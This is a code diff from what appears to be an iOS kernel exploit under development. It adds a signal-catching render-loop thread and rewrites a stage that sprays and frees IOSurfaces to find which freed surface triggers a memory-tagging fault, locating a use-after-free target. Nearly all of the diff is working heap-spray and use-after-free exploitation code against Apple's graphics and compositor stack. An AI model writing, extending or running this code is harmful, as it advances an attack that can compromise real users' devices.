@@ -1451,6 +1451,79 @@ static void *p13_spam_reg(void *arg) {
 static volatile int p13_render_run = 0;
 static volatile int p13_render_frames = 0;
 
+/* Safe render loop variant: installs signal handler + sigsetjmp in the
+ * render loop THREAD so MTE faults during compositor traversal (which
+ * happen in this thread's kernel context during IOSurfaceCreate) can
+ * be caught. Returns (void*)0 on normal exit, (void*)signal_number if
+ * a signal was caught. */
+static sigjmp_buf p13_safe_jmpbuf;
+static volatile sig_atomic_t p13_safe_signal = 0;
+
+static void p13_safe_sighandler(int sig, siginfo_t *si, void *ctx) {
+    (void)si; (void)ctx;
+    p13_safe_signal = sig;
+    siglongjmp(p13_safe_jmpbuf, sig);
+}
+
+static void *p13_render_loop_safe(void *arg) {
+    (void)arg;
+
+    struct sigaction sa, old_bus, old_segv;
+    memset(&sa, 0, sizeof(sa));
+    sa.sa_sigaction = p13_safe_sighandler;
+    sa.sa_flags = SA_SIGINFO;
+    sigemptyset(&sa.sa_mask);
+    sigaction(SIGBUS, &sa, &old_bus);
+    sigaction(SIGSEGV, &sa, &old_segv);
+
+    p13_safe_signal = 0;
+    if (sigsetjmp(p13_safe_jmpbuf, 1) != 0) {
+        sigaction(SIGBUS, &old_bus, NULL);
+        sigaction(SIGSEGV, &old_segv, NULL);
+        return (void *)(uintptr_t)p13_safe_signal;
+    }
+
+    void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+    if (metal_lib) {
+        typedef void *(*MTLCreateDev_t)(void);
+        MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+        if (createDev) createDev();
+    }
+
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = 64, h = 64, bpe = 4, bpr = w * bpe;
+    int pf = 0x42475241;
+    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+
+    while (p13_render_run && p13_render_frames < 100000) {
+        IOSurfaceRef s = IOSurfaceCreate(props);
+        if (s) {
+            CVPixelBufferRef pb = NULL;
+            CVPixelBufferCreateWithIOSurface(NULL, s, NULL, &pb);
+            if (pb) CFRelease(pb);
+            CFRelease(s);
+        }
+        usleep(16000);
+        p13_render_frames++;
+    }
+    CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn);
+    CFRelease(props);
+    if (metal_lib) dlclose(metal_lib);
+    sigaction(SIGBUS, &old_bus, NULL);
+    sigaction(SIGSEGV, &old_segv, NULL);
+    return NULL;
+}
+
 static void *p13_render_loop(void *arg) {
     (void)arg;
     /* Load Metal via dlopen — we're pure C but just need MTLCreateSystemDefaultDevice() */
@@ -19777,28 +19850,23 @@ new_modes:
                 int r229_mte_match = 0;
                 int r229_match_idx = -1;
 
-                /* === Phase 14 detection: free-and-test with signal/exception handling ===
+                /* === Phase 14 detection: free-and-test with SAFE render loop ===
                  *
-                 * Three identification stages:
+                 * The compositor traversal is ASYNC-ONLY — it happens inside
+                 * the render loop thread's kernel context during IOSurfaceCreate,
+                 * NOT on the main thread. So signal handling must be IN the
+                 * render loop thread itself (p13_render_loop_safe).
                  *
-                 * Stage A: Fast bulk free [255..64] with periodic render loop
-                 *          checks (empirically safe — match is in [0..63]).
+                 * Stage A: Fast bulk free [255..64] with safe render loop checks.
+                 *          If the match is in this range, the safe render loop
+                 *          catches the signal and returns non-NULL.
                  *
-                 * Stage B: Main-thread single-frame trigger with sigsetjmp [63..0].
-                 *          After freeing each surface, create a throwaway IOSurface
-                 *          + CVPixelBuffer from the main thread. If the compositor
-                 *          traversal happens synchronously in our kernel context,
-                 *          the MTE fault delivers SIGBUS to the calling thread,
-                 *          and siglongjmp catches it.
+                 * Stage B: Per-surface free-and-test [63..0] with safe render loop.
+                 *          Free one surface, run safe render loop for ~100ms.
+                 *          If it returns non-NULL → signal caught → match found.
                  *
-                 * Stage C: Render loop thread + Mach exception port [remaining].
-                 *          If Stage B triggers didn't cause the traversal, fall
-                 *          back to the render loop with a Mach exception port
-                 *          to intercept EXC_BAD_ACCESS from any thread.
-                 *
-                 * If none catches the signal (SIGKILL is uncatchable), the app
-                 * crashes as before but we've written the test index to a state
-                 * file for post-mortem analysis. */
+                 * If SIGKILL (uncatchable), the app crashes. We write the test
+                 * index to a state file for post-mortem analysis. */
                 {
                     /* Step 1: bare render loop sanity check */
                     rlog("  r=229: Testing bare render loop restart...\n");
@@ -19809,56 +19877,13 @@ new_modes:
                     usleep(200000);
                     p13_render_run = 0;
                     pthread_join(rt0, NULL);
-                    rlog("  r=229: Bare render loop survived.\n");
-
-                    /* Step 2: Set up Mach exception port */
-                    mach_port_t ft_exc_port = MACH_PORT_NULL;
-                    kern_return_t ekr = mach_port_allocate(mach_task_self(),
-                        MACH_PORT_RIGHT_RECEIVE, &ft_exc_port);
-                    if (ekr == KERN_SUCCESS) {
-                        mach_port_insert_right(mach_task_self(), ft_exc_port,
-                            ft_exc_port, MACH_MSG_TYPE_MAKE_SEND);
-                        task_set_exception_ports(mach_task_self(),
-                            EXC_MASK_BAD_ACCESS | EXC_MASK_BAD_INSTRUCTION,
-                            ft_exc_port,
-                            EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,
-                            THREAD_STATE_NONE);
-                        rlog("  r=229: Mach exception port %u installed\n", ft_exc_port);
-                    } else {
-                        rlog("  r=229: Mach exception port alloc failed: %d\n", ekr);
-                    }
-
-                    /* Step 3: Set up signal handlers */
-                    struct sigaction ft_sa, ft_old_bus, ft_old_segv, ft_old_abrt;
-                    memset(&ft_sa, 0, sizeof(ft_sa));
-                    ft_sa.sa_sigaction = r229_ft_sighandler;
-                    ft_sa.sa_flags = SA_SIGINFO;
-                    sigemptyset(&ft_sa.sa_mask);
-                    sigaction(SIGBUS, &ft_sa, &ft_old_bus);
-                    sigaction(SIGSEGV, &ft_sa, &ft_old_segv);
-                    sigaction(SIGABRT, &ft_sa, &ft_old_abrt);
-                    rlog("  r=229: Signal handlers installed (SIGBUS/SIGSEGV/SIGABRT)\n");
-
-                    /* Create IOSurface props for throwaway trigger surfaces */
-                    CFMutableDictionaryRef ft_props = CFDictionaryCreateMutable(NULL, 0,
-                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-                    int ft_w = 64, ft_h = 64, ft_bpe = 4, ft_bpr = ft_w * ft_bpe;
-                    int ft_pf = 0x42475241; /* BGRA */
-                    CFNumberRef ft_wn = CFNumberCreate(NULL, kCFNumberIntType, &ft_w);
-                    CFNumberRef ft_hn = CFNumberCreate(NULL, kCFNumberIntType, &ft_h);
-                    CFNumberRef ft_bn = CFNumberCreate(NULL, kCFNumberIntType, &ft_bpe);
-                    CFNumberRef ft_rn = CFNumberCreate(NULL, kCFNumberIntType, &ft_bpr);
-                    CFNumberRef ft_pfn = CFNumberCreate(NULL, kCFNumberIntType, &ft_pf);
-                    CFDictionarySetValue(ft_props, CFSTR("IOSurfaceWidth"), ft_wn);
-                    CFDictionarySetValue(ft_props, CFSTR("IOSurfaceHeight"), ft_hn);
-                    CFDictionarySetValue(ft_props, CFSTR("IOSurfaceBytesPerElement"), ft_bn);
-                    CFDictionarySetValue(ft_props, CFSTR("IOSurfaceBytesPerRow"), ft_rn);
-                    CFDictionarySetValue(ft_props, CFSTR("IOSurfacePixelFormat"), ft_pfn);
+                    rlog("  r=229: Bare render loop survived (%d frames).\n",
+                        p13_render_frames);
 
                     int ft_found = -1;
 
-                    /* ---- Stage A: Fast bulk free [255..64] ---- */
-                    rlog("  r=229: Stage A: fast free [255→64]...\n");
+                    /* ---- Stage A: Fast bulk free [255..64] with safe render loop ---- */
+                    rlog("  r=229: Stage A: fast free [255->64] with safe render loop\n");
                     for (int fi = 255; fi >= 64 && ft_found < 0; fi--) {
                         if (!r229_spray[fi]) continue;
                         uint32_t sid = IOSurfaceGetID(r229_spray[fi]);
@@ -19868,188 +19893,95 @@ new_modes:
                         if (fi % 32 == 0) {
                             p13_render_frames = 0;
                             p13_render_run = 1;
+                            p13_safe_signal = 0;
                             pthread_t rft;
-                            pthread_create(&rft, NULL, p13_render_loop, NULL);
-                            usleep(80000);
+                            pthread_create(&rft, NULL, p13_render_loop_safe, NULL);
+                            usleep(100000);
                             p13_render_run = 0;
-                            pthread_join(rft, NULL);
-                            rlog("  r=229: FT-A[%d] survived (id=%u)\n", fi, sid);
+                            void *safe_ret = NULL;
+                            pthread_join(rft, &safe_ret);
+                            if (safe_ret != NULL) {
+                                rlog("  r=229: SIGNAL %d caught in safe render at FT-A[%d] id=%u!\n",
+                                    (int)(uintptr_t)safe_ret, fi, sid);
+                                ft_found = fi;
+                            } else {
+                                rlog("  r=229: FT-A[%d] survived (id=%u)\n", fi, sid);
+                            }
                         }
                     }
-                    rlog("  r=229: Stage A complete, 64 surfaces remain [0..63]\n");
+                    if (ft_found < 0)
+                        rlog("  r=229: Stage A complete, 64 surfaces remain [0..63]\n");
 
-                    /* ---- Stage B: Main-thread trigger with sigsetjmp [63..0] ---- */
-                    rlog("  r=229: Stage B: main-thread trigger [63→0] with signal handling\n");
-                    int stageB_tested = 0;
-                    for (int fi = 63; fi >= 0 && ft_found < 0; fi--) {
-                        if (!r229_spray[fi]) continue;
+                    /* ---- Stage B: Per-surface free + safe render loop [63..0] ---- */
+                    if (ft_found < 0) {
+                        rlog("  r=229: Stage B: per-surface free+safe-render [63->0]\n");
+                        int stageB_tested = 0;
+                        for (int fi = 63; fi >= 0 && ft_found < 0; fi--) {
+                            if (!r229_spray[fi]) continue;
 
-                        /* Write test index to state file */
-                        {
-                            char sp[512];
-                            snprintf(sp, sizeof(sp), "%s/Documents/r229_ft_state.bin",
-                                getenv("HOME") ? getenv("HOME") : "/var/mobile");
-                            int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                            if (sfd >= 0) {
-                                int magic = 0xF7E5;
-                                write(sfd, &magic, sizeof(int));
-                                write(sfd, &fi, sizeof(int));
-                                fsync(sfd); close(sfd);
-                            }
-                        }
-
-                        uint32_t sid = IOSurfaceGetID(r229_spray[fi]);
-                        CFRelease(r229_spray[fi]);
-                        r229_spray[fi] = NULL;
-
-                        r229_ft_signal = 0;
-                        r229_ft_test_idx = fi;
-
-                        if (sigsetjmp(r229_ft_jmpbuf, 1) == 0) {
-                            /* Normal path: main-thread single-frame trigger.
-                             * IOSurfaceCreate may trigger compositor traversal
-                             * synchronously in our kernel context. If the freed
-                             * surface was the match, the MTE fault should deliver
-                             * SIGBUS to this thread. */
-                            for (int trig = 0; trig < 3 && ft_found < 0; trig++) {
-                                IOSurfaceRef ts = IOSurfaceCreate(ft_props);
-                                if (ts) {
-                                    CVPixelBufferRef tpx = NULL;
-                                    CVPixelBufferCreateWithIOSurface(NULL, ts, NULL, &tpx);
-                                    usleep(20000);
-                                    if (tpx) CFRelease(tpx);
-                                    CFRelease(ts);
+                            /* Write test index to state file for post-mortem */
+                            {
+                                char sp[512];
+                                snprintf(sp, sizeof(sp), "%s/Documents/r229_ft_state.bin",
+                                    getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                                int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                                if (sfd >= 0) {
+                                    int magic = 0xF7E5;
+                                    write(sfd, &magic, sizeof(int));
+                                    write(sfd, &fi, sizeof(int));
+                                    fsync(sfd); close(sfd);
                                 }
                             }
-                            usleep(10000);
 
-                            /* Check Mach exception port (non-blocking) */
-                            if (ft_exc_port != MACH_PORT_NULL) {
-                                struct {
-                                    mach_msg_header_t head;
-                                    char data[256];
-                                } exc_msg;
-                                kern_return_t mkr = mach_msg(&exc_msg.head,
-                                    MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                                    0, sizeof(exc_msg), ft_exc_port,
-                                    0, MACH_PORT_NULL);
-                                if (mkr == KERN_SUCCESS) {
-                                    rlog("  r=229: MACH EXCEPTION on FT-B[%d] id=%u → MATCH!\n",
+                            uint32_t sid = IOSurfaceGetID(r229_spray[fi]);
+                            CFRelease(r229_spray[fi]);
+                            r229_spray[fi] = NULL;
+
+                            /* Run safe render loop — compositor traversal happens
+                             * in this thread's kernel context. If the freed surface
+                             * was the match, the stale notification entry reads
+                             * freed memory → MTE fault → SIGBUS in the render
+                             * loop thread → sigsetjmp catches it → returns non-NULL */
+                            p13_render_frames = 0;
+                            p13_render_run = 1;
+                            p13_safe_signal = 0;
+                            pthread_t rft;
+                            pthread_create(&rft, NULL, p13_render_loop_safe, NULL);
+                            usleep(100000);
+                            p13_render_run = 0;
+                            void *safe_ret = NULL;
+                            pthread_join(rft, &safe_ret);
+
+                            if (safe_ret != NULL) {
+                                rlog("  r=229: SIGNAL %d caught in safe render at FT-B[%d] id=%u -> MATCH!\n",
+                                    (int)(uintptr_t)safe_ret, fi, sid);
+                                ft_found = fi;
+                            } else {
+                                stageB_tested++;
+                                if (fi % 8 == 0) {
+                                    rlog("  r=229: FT-B[%d] survived safe render (id=%u)\n",
                                         fi, sid);
-                                    ft_found = fi;
                                 }
                             }
-
-                            /* Survived main-thread trigger */
-                            stageB_tested++;
-                            if (fi % 8 == 0) {
-                                rlog("  r=229: FT-B[%d] survived main-thread trigger (id=%u)\n",
-                                    fi, sid);
-                            }
-                        } else {
-                            /* Signal caught via siglongjmp! */
-                            rlog("  r=229: SIGNAL %d on FT-B[%d] id=%u → MATCH CAUGHT!\n",
-                                r229_ft_signal, fi, sid);
-                            ft_found = fi;
                         }
+                        rlog("  r=229: Stage B tested %d surfaces, found=%d\n",
+                            stageB_tested, ft_found);
                     }
-                    rlog("  r=229: Stage B tested %d surfaces, found=%d\n",
-                        stageB_tested, ft_found);
-
-                    /* ---- Stage C: Render loop + Mach exc port (if B didn't trigger) ----
-                     * If Stage B survived all 64 without catching a signal, the
-                     * main-thread trigger didn't cause the traversal. We've already
-                     * freed all surfaces, so if no match was found, the stale entry
-                     * was cleaned up or the traversal is only async (render loop).
-                     *
-                     * Since all surfaces are freed, re-spray and try render loop
-                     * approach with Mach exception port monitoring. */
-                    if (ft_found < 0 && stageB_tested >= 60) {
-                        rlog("  r=229: Stage C: main-thread trigger didn't crash.\n");
-                        rlog("  r=229: All 64 surfaces freed without fault.\n");
-                        rlog("  r=229: Traversal may be async-only (render loop).\n");
-                        rlog("  r=229: Re-spraying and testing with render loop...\n");
-
-                        /* Re-spray 64 surfaces to reclaim GEN1 slots */
-                        CFMutableDictionaryRef sp_props = CFDictionaryCreateMutable(NULL, 0,
-                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-                        int sp_w = 64, sp_h = 64, sp_bpe = 4, sp_bpr = sp_w * sp_bpe;
-                        int sp_pf = 0x42475241;
-                        CFNumberRef sp_wn = CFNumberCreate(NULL, kCFNumberIntType, &sp_w);
-                        CFNumberRef sp_hn = CFNumberCreate(NULL, kCFNumberIntType, &sp_h);
-                        CFNumberRef sp_bn = CFNumberCreate(NULL, kCFNumberIntType, &sp_bpe);
-                        CFNumberRef sp_rn = CFNumberCreate(NULL, kCFNumberIntType, &sp_bpr);
-                        CFNumberRef sp_pfn = CFNumberCreate(NULL, kCFNumberIntType, &sp_pf);
-                        CFDictionarySetValue(sp_props, CFSTR("IOSurfaceWidth"), sp_wn);
-                        CFDictionarySetValue(sp_props, CFSTR("IOSurfaceHeight"), sp_hn);
-                        CFDictionarySetValue(sp_props, CFSTR("IOSurfaceBytesPerElement"), sp_bn);
-                        CFDictionarySetValue(sp_props, CFSTR("IOSurfaceBytesPerRow"), sp_rn);
-                        CFDictionarySetValue(sp_props, CFSTR("IOSurfacePixelFormat"), sp_pfn);
-
-                        int respray_n = 0;
-                        for (int si = 0; si < 64; si++) {
-                            r229_spray[si] = IOSurfaceCreate(sp_props);
-                            if (r229_spray[si]) respray_n++;
-                        }
-                        rlog("  r=229: Re-sprayed %d surfaces\n", respray_n);
-
-                        CFRelease(sp_wn); CFRelease(sp_hn); CFRelease(sp_bn);
-                        CFRelease(sp_rn); CFRelease(sp_pfn); CFRelease(sp_props);
-
-                        /* Test render loop — if stale entry was cleaned up, this
-                         * survives. If not, we may get a new match. */
-                        p13_render_frames = 0;
-                        p13_render_run = 1;
-                        pthread_t rc_th;
-                        pthread_create(&rc_th, NULL, p13_render_loop, NULL);
-                        usleep(200000);
-                        p13_render_run = 0;
-                        pthread_join(rc_th, NULL);
-
-                        /* Check exception port */
-                        if (ft_exc_port != MACH_PORT_NULL) {
-                            struct {
-                                mach_msg_header_t head;
-                                char data[256];
-                            } exc_msg;
-                            kern_return_t mkr = mach_msg(&exc_msg.head,
-                                MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                                0, sizeof(exc_msg), ft_exc_port,
-                                0, MACH_PORT_NULL);
-                            if (mkr == KERN_SUCCESS) {
-                                rlog("  r=229: MACH EXCEPTION in Stage C render loop!\n");
-                            }
-                        }
-
-                        rlog("  r=229: Stage C render loop survived (stale entry gone?)\n");
-                        rlog("  r=229: Proceeding with all %d re-sprayed surfaces\n", respray_n);
-                    }
-
-                    /* Restore signal handlers */
-                    sigaction(SIGBUS, &ft_old_bus, NULL);
-                    sigaction(SIGSEGV, &ft_old_segv, NULL);
-                    sigaction(SIGABRT, &ft_old_abrt, NULL);
-                    rlog("  r=229: Signal handlers restored\n");
-
-                    /* Cleanup */
-                    CFRelease(ft_wn); CFRelease(ft_hn); CFRelease(ft_bn);
-                    CFRelease(ft_rn); CFRelease(ft_pfn); CFRelease(ft_props);
 
                     if (ft_found >= 0) {
                         rlog("  r=229: *** MATCH IDENTIFIED: spray[%d] ***\n", ft_found);
                         r229_match_idx = ft_found;
                         r229_mte_match = 1;
                     } else {
-                        rlog("  r=229: No match identified via signal handling.\n");
-                        rlog("  r=229: Likely SIGKILL (uncatchable MTE fault).\n");
-                        /* Count remaining live surfaces */
+                        rlog("  r=229: No match identified via safe render loop.\n");
+                        rlog("  r=229: Likely SIGKILL (uncatchable) or match was in [255..64].\n");
                         int live_n = 0;
                         for (int si = 0; si < 256; si++) {
                             if (r229_spray[si]) live_n++;
                         }
                         rlog("  r=229: %d live surfaces remain — proceeding blind\n", live_n);
                         r229_mte_match = 1;
-                        r229_match_idx = -1; /* unknown — use all surfaces */
+                        r229_match_idx = -1;
                     }
                 }
 
